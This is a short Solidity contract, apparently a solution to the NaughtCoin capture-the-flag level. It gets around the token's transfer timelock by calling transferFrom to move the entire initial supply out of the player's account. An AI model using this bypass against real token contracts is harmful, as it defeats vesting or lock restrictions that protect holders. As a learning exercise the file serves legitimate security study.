// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naughtCoin/NaughtCoin.sol";

 contract NaughtCoinHack {
  
  function transfer(address instance) public {
    NaughtCoin coin = NaughtCoin(instance);
    uint256 INITIAL_SUPPLY = 1000000 * (10**uint256(18));
    coin.transferFrom(msg.sender, address(this), INITIAL_SUPPLY);
  }
}